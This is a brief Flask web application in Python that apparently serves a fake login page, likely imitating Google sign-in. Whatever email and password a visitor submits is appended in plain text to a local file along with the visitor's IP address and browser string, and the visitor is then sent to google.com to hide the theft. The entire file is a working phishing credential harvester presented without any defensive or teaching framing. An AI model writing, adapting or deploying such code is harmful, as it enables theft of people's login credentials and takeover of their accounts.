from flask import Flask , render_template, request ,redirect
from flask import request
from flask import jsonify
from flask import url_for

#from OpenSSL import SSL
#context = SSL.Context(SSL.PROTOCOL_TLSv1_2)
#context.use_privatekey_file('server.key')
#context.use_certificate_file('server.crt')


app = Flask(__name__)

def Write_to_file(email,password,browser,user_ip):
	with open("pass.txt", "a") as datato:
		datato.write("\n")
		datato.write("Email = " + email)
		datato.write("\n")
		datato.write("Password = " + password)
		datato.write("\nUser IP = " + str(user_ip))
		datato.write("\nBrowser = " + browser)
		datato.write("\n\n")
		datato.write("---------------------------------------------------------------------")
		datato.write("\n")




@app.route('/index', methods=["GET","POST"])
def index():
	user_browser = request.headers.get('User-Agent')
	user_ip = request.remote_addr
	
	if request.method == "POST":
		Email = request.form['Email']
		Password = request.form['Passwd']
		Write_to_file(Email,Password,user_browser,user_ip)
		return redirect("http://www.google.com")
		
	return render_template('index.html')


if __name__ == "__main__":
    app.run()
